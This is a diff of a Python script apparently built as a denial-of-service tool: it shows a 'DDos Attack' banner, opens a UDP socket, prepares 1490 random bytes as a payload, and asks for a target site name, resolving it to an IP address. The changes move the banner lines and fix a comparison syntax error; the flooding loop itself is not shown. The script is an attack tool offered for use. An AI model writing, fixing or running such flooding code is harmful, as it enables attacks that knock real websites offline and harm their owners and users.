@@ -4,6 +4,9 @@ import time
 import socket
 import random
 
+os.system("clear")
+os.system("figlet DDos Attack")
+
 from datetime import datetime
 now = datetime.now()
 hour = now.hour
@@ -11,9 +14,6 @@ minute = now.minute
 day = now.day
 month = now.month
 year = now.year
-
-os.system("clear")
-os.system("figlet DDos Attack")
 
 sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 bytes = random._urandom(1490)
@@ -35,7 +35,7 @@ print()
 print()
 print
 app = int(input('select a number to launch the app'))
-if app = 1:
+if app == 1:
     print
 site = input('Имя сайта: ')
 ip = socket.gethostbyname(site) 
